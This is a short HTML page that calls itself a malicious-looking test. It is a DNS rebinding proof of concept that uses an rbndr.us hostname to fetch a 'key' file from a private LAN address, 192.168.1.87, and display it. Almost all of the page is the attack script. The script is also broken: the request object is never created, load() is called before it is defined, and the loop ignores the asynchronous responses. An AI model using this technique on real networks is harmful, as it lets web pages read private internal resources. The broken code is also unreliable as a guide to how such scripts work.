<html>
<head>I am Bait</head>
<body>
	<div> This is a wannabe malicious-y test page running a script. </div>
	<script>
		load();
	</script>
	<p id="reply"></p>

	<script>
		function load() {
			var foundIt = false;
			var response = "";
			var breakSwitch = 0;

			while(foundIt != true && breakSwitch < 50){
					breakSwitch ++;

					xhttp.onreadystatechange = function() {
							if (this.readyState == 4 && this.status == 200) {
									console.log("here");
									var response = this.responseText;
									substring = "key";
									if(response.indexOf(substring) !== -1){
											document.getElementById("reply").innerHTML = response;
											foundIt=true;
											console.log("Found key!");
									}else{
											console.log("Key not found, retrying....");
									}
							}
					};

					//var data = "{}";
					xhttp.open("GET", "http://a48a1f96.c0a80157.rbndr.us/key.html", true);
					//xhttp.open("GET", "http://192.168.1.87/key.html", true);
					xhttp.setRequestHeader("Content-type", "text/plain");
					//xhttp.send(data);
					console.log("Sending request!");
			  		xhttp.send();
			}
		}
	</script>
</body>
</html>
